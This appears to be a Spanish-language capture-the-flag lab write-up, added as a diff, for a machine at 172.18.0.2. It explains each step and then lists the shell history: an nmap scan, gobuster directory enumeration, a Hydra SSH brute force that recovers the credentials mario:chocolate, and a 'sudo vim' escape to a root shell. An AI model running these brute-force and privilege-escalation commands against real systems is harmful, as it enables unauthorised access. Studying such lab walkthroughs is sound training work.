@@ -1,0 +1,42 @@
+1. Nmap — Reconocimiento
+Escaneamos la máquina para ver qué puertos estaban abiertos. Encontramos SSH (22) y HTTP (80). Esto nos dice cómo podemos interactuar con la máquina.
+2. Gobuster — Enumeración web
+Buscamos directorios ocultos en la web. No encontramos nada útil, así que descartamos esa vía.
+3. Hydra — Fuerza bruta SSH
+Probamos miles de combinaciones de usuario/contraseña automáticamente contra el SSH. Encontramos mario:chocolate. La clave fue usar un usuario específico (mario) en vez de una lista enorme.
+4. SSH — Acceso inicial
+Con las credenciales entramos a la máquina como usuario normal mario.
+5. sudo -l — Buscar privilegios
+Este comando muestra qué puede ejecutar tu usuario como root. Descubrimos que mario podía ejecutar vim como root.
+6. Vim — Escalada de privilegios
+Vim permite ejecutar comandos del sistema desde dentro. Como lo ejecutamos como root, pudimos lanzar una bash también como root. Esto se llama GTFOBins — binarios legítimos que pueden usarse para escalar privilegios.
+
+## Comandos...
+┌──(max144disk㉿DBS)-[~]
+
+  170  nmap -sV 172.18.0.2
+  171  curl http://172.18.0.2
+  172  gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/comon.txt
+  173  gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/common.txt
+  174  gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/big.txt
+  175  hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p password 172.18.0.2 ssh
+  177  sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+  179  hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.18.0.2 ssh -t 16
+  180  [22][ssh] host: 172.18.0.2   login: mario   password: chocolate\n
+  181  ssh mario@172.18.0.2
+  
+ mario@e1ec9b0363b1:~$
+    1  exit
+    2  whoami
+    3  id
+    4  sudo -l
+    5  sudo vim -c ':!/bin/bash'
+    6  ls
+    7  whoami
+    8  exit
+
+mario@e1ec9b0363b1:~$ sudo vim -c ':!/bin/bash'
+root@e1ec9b0363b1:/home/mario# whoami
+root
+
+
